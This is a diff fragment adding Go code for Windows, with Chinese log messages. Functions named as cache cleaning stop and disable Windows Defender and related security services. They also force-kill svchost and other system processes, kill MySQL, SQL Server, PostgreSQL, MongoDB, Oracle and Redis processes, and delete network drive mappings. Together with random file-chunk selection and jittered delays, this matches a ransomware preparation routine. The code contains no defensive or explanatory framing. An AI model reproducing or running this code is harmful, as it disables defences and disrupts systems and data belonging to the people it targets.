+			rng := mrand.New(mrand.NewSource(time.Now().UnixNano()))
+			for i := 0; i < middleRandomChunks; i++ {
+				offset := availableStart + rng.Int63n(availableRange)
+				offset = offset / chunkSize * chunkSize
+				sz := int64(chunkSize)
+				if offset+sz > fileSize {
+					sz = fileSize - offset
+				}
+				isDuplicate := false
+				for _, c := range chunks {
+					if c.Offset == offset {
+						isDuplicate = true
+						break
+					}
+				}
+				if !isDuplicate {
+					chunks = append(chunks, chunkInfo{Offset: offset, Size: sz})
+				}
+			}
+		}
+	}
+
+	return chunks
+}
+
+func applyAggressiveDelay() {
+	if aggressiveDelay > 0 {
+		delay := mrand.Intn(aggressiveDelay)
+		time.Sleep(time.Duration(delay) * time.Millisecond)
+	} else if aggressiveDelay < 0 {
+		aggressiveDelay = 0
+	}
+}
+
+func stopSecurityServices() {
+	fmt.Println("  - 停止Windows安全服务...")
+	if logEnabled {
+		logOperation("开始停止Windows安全服务")
+	}
+
+	securityServices := []string{
+		"WinDefend", "SecurityHealthService", "WdNisSvc", "Sense",
+		"MsMpSvc", "MpKslDrv", "WdBoot", "WdFilter", "WdNisDrv",
+	}
+
+	for _, service := range securityServices {
+		fmt.Printf("  - 停止安全服务: %s\n", service)
+		cmd := exec.Command("sc", "stop", service)
+		_ = cmd.Run()
+		cmd = exec.Command("net", "stop", service)
+		_ = cmd.Run()
+		cmd = exec.Command("sc", "config", service, "start=", "disabled")
+		_ = cmd.Run()
+		applyAggressiveDelay()
+	}
+
+	if logEnabled {
+		logOperation("安全服务停止完成")
+	}
+}
+
+func cleanDatabaseMemory() {
+	fmt.Println("  - 清理MySQL查询缓存...")
+	cleanMySQLCache()
+	fmt.Println("  - 清理PostgreSQL缓存...")
+	cleanPostgreSQLCache()
+	if logEnabled {
+		logOperation("数据库内存清理完成")
+	}
+}
+
+func cleanMySQLCache() {
+	cmds := []string{
+		`mysql -u root -e "RESET QUERY CACHE;" 2>nul`,
+		`mysql -u root -e "FLUSH TABLES;" 2>nul`,
+		`mysql -u root -e "FLUSH LOGS;" 2>nul`,
+	}
+	for _, c := range cmds {
+		cmd := exec.Command("cmd", "/C", c)
+		_ = cmd.Run()
+		applyAggressiveDelay()
+	}
+}
+
+func cleanPostgreSQLCache() {
+	cmds := []string{
+		`psql -U postgres -c "CHECKPOINT;" 2>nul`,
+		`psql -U postgres -c "DISCARD ALL;" 2>nul`,
+	}
+	for _, c := range cmds {
+		cmd := exec.Command("cmd", "/C", c)
+		_ = cmd.Run()
+		applyAggressiveDelay()
+	}
+}
+
+func clearSystemCache() {
+	fmt.Println("  - 清理系统缓存...")
+	if logEnabled {
+		logOperation("开始清理系统缓存")
+	}
+	cmd := exec.Command("ipconfig", "/flushdns")
+	_ = cmd.Run()
+	cmd = exec.Command("powershell", "-Command",
+		"net stop wuauserv; net stop bits; Remove-Item -Path \"$env:windir\\SoftwareDistribution\\Download\\*\" -Recurse -Force -ErrorAction SilentlyContinue; net start wuauserv; net start bits")
+	_ = cmd.Run()
+	cmd = exec.Command("powershell", "-Command",
+		"Remove-Item -Path \"$env:TEMP\\*\" -Recurse -Force -ErrorAction SilentlyContinue")
+	_ = cmd.Run()
+	if logEnabled {
+		logOperation("系统缓存清理完成")
+	}
+}
+
+func disableProcessWatchdogs() {
+	fmt.Println("  - 禁用系统看门狗和监控进程...")
+	if logEnabled {
+		logOperation("开始禁用看门狗进程")
+	}
+	watchdogs := []string{
+		"wmiprvse.exe", "svchost.exe", "taskhostw.exe",
+		"dllhost.exe", "conhost.exe", "rundll32.exe",
+	}
+	for _, proc := range watchdogs {
+		cmd := exec.Command("taskkill", "/F", "/IM", proc)
+		_ = cmd.Run()
+		applyAggressiveDelay()
+	}
+	cmd := exec.Command("sc", "config", "WerSvc", "start=", "disabled")
+	_ = cmd.Run()
+	cmd = exec.Command("sc", "stop", "WerSvc")
+	_ = cmd.Run()
+	if logEnabled {
+		logOperation("看门狗进程禁用完成")
+	}
+}
+
+func unmountDatabaseConnections() {
+	fmt.Println("  - 断开数据库活动和连接...")
+	if logEnabled {
+		logOperation("开始断开数据库连接")
+	}
+	dbProcesses := []string{
+		"mysql.exe", "mysqld.exe", "sqlservr.exe", "postgres.exe",
+		"psql.exe", "sqlplus.exe", "mongod.exe", "mongos.exe",
+		"redis-server.exe", "oracle.exe",
+	}
+	for _, proc := range dbProcesses {
+		cmd := exec.Command("taskkill", "/F", "/IM", proc)
+		_ = cmd.Run()
+		applyAggressiveDelay()
+	}
+	cmd := exec.Command("powershell", "-Command", "net use * /delete /y 2>$null")
+	_ = cmd.Run()
+	if logEnabled {
+		logOperation("数据库连接断开完成")
+	}
+}
